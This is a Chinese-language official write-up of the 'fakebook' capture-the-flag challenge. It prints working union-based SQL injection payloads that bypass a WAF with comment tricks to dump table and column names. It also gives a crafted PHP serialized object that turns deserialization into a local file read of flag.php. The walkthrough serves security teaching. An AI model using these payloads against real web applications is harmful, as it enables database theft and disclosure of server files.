### 题目fakebook的官方WP

官方

admin发布于2021-01-12

浏览量3577

举报

# fakebook

## **[目的]**

sql注入+反序列化+LFR

## **[环境]**

linux

## **[工具]**

Firefox

### 一：

注册后扫描目录发现：/robots.txt

测试发现/view.php?no=1 参数存在SQL注入，但是union select被waf拦截了

尝试绕过

```
爆表名
/view.php?no=-6 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()#
爆列名
/view.php?no=-6 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=database()#
爆字段
/view.php?no=-6 union/**/select 1,data,3,4  from users#
```

结果是一个序列化的值

大概的思路为，我们输入的信息被保存为序列化，读取的时候会从数据库中取出并反序列化，然后显示在blog界面。 、

function get($url)获取的blog连接，如果连接失败就404，否则读取文件信息。

所以我们可以通过反序列化来实现ssrf读取任意文件，构造我们想要的路径，然后为了绕过正则，不从注册登录的地方下手，直接人为构造联合查询返回语句，data字段在第四个位置。

`/view.php?no=0/**/union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'`  
在源代码中得到flag的base64编码，解码后得到flag值





